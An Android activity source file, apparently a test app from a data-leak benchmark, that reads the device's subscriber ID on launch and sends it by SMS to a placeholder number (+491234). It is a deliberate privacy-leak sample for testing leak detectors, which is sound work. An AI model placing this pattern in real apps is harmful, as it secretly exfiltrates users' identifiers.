package de.ecspride.androidtestapps.directleaksubscriberid;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class DirectLeakSubsriberId extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_direct_leak_subsriber_id);
		
		TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+491234", null, mgr.getSubscriberId(), null, null);
	}
}
